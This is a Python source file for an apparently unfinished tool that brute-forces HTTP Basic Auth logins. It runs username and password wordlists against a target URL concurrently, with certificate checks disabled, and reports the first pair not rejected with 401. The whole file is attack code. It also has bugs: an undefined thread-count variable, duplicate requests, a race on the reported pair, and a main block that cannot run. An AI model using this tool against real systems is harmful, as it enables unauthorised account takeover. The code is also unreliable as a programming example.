# encoding:utf-8

# 并发库
import gevent
from gevent.pool import Pool
from gevent import monkey
monkey.patch_all()
# 常规库
import base64
import requests
from requests.auth import HTTPBasicAuth
import urllib3
urllib3.disable_warnings()
from enum import Enum
from core.settings import *

class reqMethod(Enum):
    GET     = "GET"
    POST    = "POST"
    OPTIONS = "OPTIONS"
    HEAD    = "HEAD"

class Brute:
    '''
    爆破类
    '''

    def __init__(self, url, thread):
        self.url = url
        self.threadNum = thread
        self.isSucceed = 0
        self.nowPair = ""
        # TODO 从setting.py中解析以下配置项目
        self.reqMethod = reqMethod.GET
        self.timeout = 5
        self.SSL_veirfy = False

        # TODO 加载setting.py
        DEFAULT_HEADERS = {}

    def preloadBasic(self):
        try:
            resp = requests.get(self.url, timeout=self.timeout, verify=self.SSL_veirfy)
            if 401 == resp.status_code:
                return True
            print("[!]Target may not using Basic Auth, status_code:(%s)" % resp.status_code)
        except Exception as e:
            print("[!]req error, Target may be down:(%s)" % e)
        return False


    def loadDic(self):
        '''
        加载账号密码字典,并返回两个列表
        :return: userList, pwdList
        '''
        # TODO 加载账号密码并返回, 配置文件settings.py中有字典的路径
        userList = []
        pwdList = []
        with open(usernameDicPath, "r") as Fs:
            for user in Fs.readlines():
                user = user.strip()
                userList.append(user)
        with open(passwordDicPath, "r") as Fs:
            for pwd in Fs.readlines():
                pwd = pwd.strip()
                pwdList.append(pwd)
        print("[+]Wordlists loaded, user/%s, pass/%s" % (len(userList), len(pwdList)))
        return userList, pwdList

    def yieldAuth(self):
        '''编码Basic Auth用到的账号密码. 每次返回一个HTTPBasicAuth对象, 供requests的auth参数使用
        :str usr:用户名
        :List pwd: 密码
        :return: yield HTTPBasicAuth(usr, pwd)
        '''
        # 生成器
        if (self.userList and self.pwdList):
            for usr in self.userList:
                for pwd in self.pwdList:
                    usr = str(usr).strip()
                    pwd = str(pwd).strip()
                    self.nowPair = "user/pass: %s/%s" % (usr, pwd)
                    yield HTTPBasicAuth(usr, pwd)
        else:
            print("username or password CANNOT be Null")

    # def yieldB64(self):
    #     '''编码Basic Auth用到的账号密码. 每次返回一个HTTPBasicAuth对象, 供requests的auth参数使用
    #     :str usr:用户名
    #     :List pwd: 密码
    #     :return: yield HTTPBasicAuth(usr, pwd)
    #     '''
    #     # 生成器
    #     if (self.userList and self.pwdList):
    #         for usr in self.userList:
    #             for pwd in self.pwdList:
    #                 usr = str(usr).strip()
    #                 pwd = str(pwd).strip()
    #                 src = "%s:%s" % (usr, pwd)
    #                 yield base64.b64encode(src.encode()).decode()
    #     else:
    #         print("username or password CANNOT be Null")


    def req(self, auth):
        '''将Basic认证头添加到HTTP请求头中, 并返回一个reponse对象
        :return: requests Response
        '''
        if (not self.isSucceed):
            try:
                if self.reqMethod == reqMethod.GET:
                    resp = requests.get(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
                elif self.reqMethod == reqMethod.POST:
                    resp = requests.post(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
                else:
                # 未指定方法时, 使用HEAD方法
                    resp = requests.head(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
                print("[-]Now trying to login with: %s" % self.nowPair)
                # 中断标记。若爆破成功，停止爆破
                if 401 != resp.status_code:
                    self.isSucceed = 1

            except Exception as e:
                #TODO log it
                print("[-]request error, reason: %s" % e)
        else:
            # 爆破成功，打印结果
            print("[+]Good, Result is: %s" % self.nowPair)


    def run(self):
        '''
        爆破的运行方法
        :return:
        '''
        # 预检查，页面状态码是否为401
        if False == self.preloadBasic():
            exit()
        # 加载字典, 并完成生成器的初始化
        self.userList, self.pwdList = self.loadDic()
        pool = Pool(self.threadNum)
        jobs = []
        for auth in self.yieldAuth():
            for i in range(threadNum):
                jobs.append(pool.spawn(self.req, auth))
            gevent.joinall(jobs)
        # jobs = [pool.spawn(self.req, auth) for auth in self.yieldAuth()]
        # gevent.joinall(jobs)
        print("Done, if there is no results, then Brute Force regarded failed")

if __name__ == "__main__":
    b = Brute()
